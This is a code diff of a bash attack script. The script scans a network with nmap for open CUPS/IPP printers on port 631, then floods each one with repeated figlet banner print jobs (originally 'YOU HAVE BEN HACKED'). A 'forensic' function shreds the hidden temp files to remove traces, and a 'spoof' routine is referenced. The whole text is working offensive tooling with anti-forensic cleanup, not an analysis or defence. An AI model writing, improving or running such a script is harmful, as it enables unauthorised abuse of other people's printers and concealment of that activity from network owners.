@@ -7,23 +7,25 @@ spoof(){
 } 
 scan(){
     echo "[*] Scanning $1"
-    NET=$(cat /etc/resolv.conf | grep nameserver | cut -d ' ' -f 2)
-    TARGETS=`nmap -p 631 $1 | grep open -B 3 | grep report | cut -d ' ' -f 5 | tr ' ' '\n'`
-    TOTAL=$( echo $TARGETS | wc -l | cut -f 1 -d ' ' )
+    nmap --open -p 631 $1 | grep report | tr -d A-Za-z | tr -d [='('=] | tr -d [=')'=] | tr -s [:space:] > /tmp/.tmpT
+    TOTAL=$( cat /tmp/.tmpT | wc -l | cut -f 1 -d ' ' )
+    cat /tmp/.tmpT
+    read
 }
 exploit(){
-    figlet "YOU HAVE BEN HACKED" > temp;
+    read -p "[*] String to be printed:"
+    figlet $REPLY  > /tmp/.tmp;
     for (( l=0; l < $pages; l++ )) ; do
-	    for i in $(cat tempT); do
-		    lp -h $i:631 temp 
+	    for i in $(cat /tmp/.tmpT); do
+		    lp -h $i:631 /tmp/.tmp 
 		    sleep 2 
 	    done
     done
 }
 forensic(){
-    shred -z  temp;
-    shred -z  tempT;
-    rm -f temp tempT;
+    shred -z  /tmp/.tmp;
+    shred -z  /tmp/.tmpT;
+    rm -f /tmp/.tmp /tmp/.tmpT;
 }
 usage(){
 	echo "[!] Error, please check this help"
@@ -54,7 +56,7 @@ if [ $REPLY = 'y' ];then
 fi
 echo "[*] Searching for targets";
 scan $1
-if [ $TOTAL -eq 1 ];then
+if [ $TOTAL -lt 1 ];then
 	echo "[!] No targets found"
 	exit 1
 else
